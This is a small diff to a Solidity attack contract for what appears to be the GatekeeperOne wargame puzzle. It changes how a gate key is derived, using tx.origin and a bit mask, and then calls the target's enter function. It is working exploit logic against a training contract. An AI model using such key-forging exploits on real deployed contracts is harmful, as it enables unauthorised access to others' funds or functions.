@@ -12,7 +12,8 @@ contract AttackGatekeeperOne {
     }
 
     function attack() public {
-        bytes8 key = bytes8(uint64(msg.sender));
+        bytes8 key = bytes8(uint64(tx.origin));
+        key = key & 0x6d696b65_0000_FFFF;
         GatekeeperOne(victim).enter(key);
     }
 }
